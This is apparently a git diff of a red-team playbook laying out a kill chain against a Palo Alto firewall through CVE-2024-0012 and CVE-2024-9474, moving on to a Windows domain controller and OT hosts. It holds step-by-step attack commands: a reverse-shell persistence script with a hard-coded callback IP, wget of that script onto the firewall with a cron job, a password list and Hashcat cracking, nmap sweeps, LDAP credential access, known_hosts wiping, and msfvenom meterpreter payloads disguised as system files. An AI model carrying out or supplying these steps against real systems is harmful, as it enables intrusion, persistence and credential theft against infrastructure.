@@ -11,8 +11,9 @@ Account Discovery: Domain Account, Archive Collected Data: Archive via Utility, 
 ## Attack Flow
 
 **SUBJECT TO CHANGE**
-- `terran` -> `Djibouti` -> `Palo Alto Firewall` -> `Windows DC` -> `OT`
-- `orange-firewall(1.33.170.38)` -> `orange-dc(172.20.2.6)` -> `orange-ics(172.20.6.200)`
+
+- `terran` -> `Djibouti` -> `Palo Alto Firewall` -> `router` -> `Windows DC` -> `OT`
+- `orange-firewall(1.33.170.38)` -> `router` ->   `orange-dc(172.20.2.6)` -> `orange-ics(172.20.6.200)`
 
 Target: Palo Alto firewall management interface at XXX.XXX.XXX.XXX
 Exploit Used: `PoC.py`
@@ -23,6 +24,10 @@ CVE: `CVE-2024-0012` and `CVE-2024-9474`
 - download from source file
 - to copy and paste information simpler to from your HOST to the VM
 
+## Reminders
+
+- ALWAYS click on the terminal you want to work on
+
 ## Phase 0: Initial Setup for Kill Chain
 
 ### SSH Proxy Chain
@@ -32,7 +37,6 @@ CVE: `CVE-2024-0012` and `CVE-2024-9474`
 ```bash
 ssh -N -R 5555:localhost:22 -L 4444:<DJIBOUTI_BOX>:22 -D 1080 kali@<DJIBOUTI_BOX>
 ```
-
 
 #### Djibouti (102.214.90.X)
 
@@ -46,8 +50,9 @@ ssh -p 5555 localhost   # connect back to Terran
 ssh -p 4444 localhost   # tunnel to Djibouti
 ```
 
-### Exploit Setup:
+### Exploit Setup
 
+0. WORK ON A NEW BOX, NO TERMINALS OPEN
 1. Create a new folder on your `attack box`
    - This will stage all of the required files and scripts.
 2. Open a text editor (nano) on the attack machine. `sudo nano PoC.py`
@@ -56,7 +61,7 @@ ssh -p 4444 localhost   # tunnel to Djibouti
 4. Press `ctrl+O` and then enter to write out the file, then press `ctrl+S` to save, then press `ctrl+X` to exit the program
 5. `chmod +x PoC.py`
 
-### Persistence Script Setup:
+### Persistence Script Setup
 
 1. Perform the following command: `nano pan_os_comm.py`
 2. In nano, copy and paste the below script: **NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :)** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
@@ -111,7 +116,7 @@ sudo nano /usr/share/wordlists/rockyou.txt
 - `Ctrl+O`
 - `ctrl+X`
 
-#### PASSWORD LIST:
+#### PASSWORD LIST
 
 ```text
 Summer2025
@@ -244,17 +249,19 @@ python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_bo
 
 3. Watch the initial listener pane to ensure it catches the callback from the exploit.
    If you see the following, you have successfully exploited the Palo Alto and now have a limited bash shell into the root of the system:
-   ![image](https://github.com/user-attachments/assets/0d3b2d49-fe66-4dcb-80da-51204efebfbc)
+
+![image](https://github.com/user-attachments/assets/0d3b2d49-fe66-4dcb-80da-51204efebfbc)
 
    If you do not see the following, its time to troubleshoot.
 
 4. To receive a more usable shell tty, use the following command:
+
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-
 Troubleshooting steps:
+
    1. Use the correct IP addresses and ports in your listeners and exploit arguments
    2. Ensure there is routing to the Palo Management Interface.
    3. Ensure you copied your exploit script over correctly
@@ -272,7 +279,9 @@ Troubleshooting steps:
    - (response should be "root")
 
 ```bash
-whoami 
+whoami
+id
+bash 
 pwd
 cd ~
 ls
@@ -282,7 +291,10 @@ ls
    `wget -O /usr/local/bin/pan_os_comm.py http://<IP_of_your_attack_box>:<port>/pan_os_comm.py`
 
 3. To ensure that the file has been successfully downloaded and is executable, run:
-   `ls -l /usr/local/bin | grep pan_os`
+
+```bash
+ls -l /usr/local/bin | grep pan_os
+```
 
 4. Once you’ve confirmed the script is there, it’s time to set up the cron job to maintain persistence. To add the cron job, execute the following command:
 
@@ -325,6 +337,10 @@ sudo systemctl start ssh
 
 To confirm the service has started, run
 `systemctl status ssh`
+
+```bash
+echo '' > /root/.ssh/known_hosts
+```
 
 ```bash
 scp users.txt kali@<your_ip_address>:.
@@ -374,10 +390,9 @@ This will use Hashcat to attempt cracking the passwords. The -m 7400 option spec
 ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa admin@1.33.170.38
 ```
 
-  - When prompted, enter the cracked password. If successful, you should be logged into the Palo Alto device.
+- When prompted, enter the cracked password. If successful, you should be logged into the Palo Alto device.
 
 ![image](https://github.com/user-attachments/assets/66e07739-2790-485b-9154-57c3ca5a34c8)
-
 
 ## Phase 5: Internal Reconnaissance & Enumeration
 
@@ -389,13 +404,12 @@ Additionally, we copy all outputs from coommands into a text document on our loc
 2. View routing table and copy into same created text file: `show routing route`
 3. Check arp table: `show arp all`
 
-
-
 #### Look for management configs or logs
 
 ```bash
 cat /config/config.xml | grep -i 'mgmt\|admin\|ldap\|radius'
 ```
+
 Copy the output and paste into a text editor on your kali and save the file.
 
 #### Attempt to pivot through firewall if routing/NAT is enabled
@@ -418,7 +432,7 @@ nmap -p 389,445,88,135,139,389,636,3268,3269 -sV -Pn 172.20.0.0/16
 ## Phase 7: Credential Access (via LDAP, SAM/NTDS)
 
 - Once a DC is identified (e.g., 172.20.2.X), you can:
- 	- `88`, `389`
+  - `88`, `389`
 - Enumerate via LDAP (LOLBAS):
 
 ```bash
@@ -461,11 +475,14 @@ Target all Networking Devices and drop a payload that creates a meterpreter sess
 
 Make the Payload file for The Palo:
 On your attack box, in the same directory where you saved your scripts, run the following Command. This saves the payload to a file called pan_sec_pol.
+
 ``` bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=9729 -f elf > pan_sec_pol
 ```
+
 Next, make the payload file for the vyatta routers:
 In the same directory on your Attack box, run the following command. The payload will be saved to a file called vyos_confd
+
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your attack IP> LPORT=6342 -f elf >vyos_confd
 ```
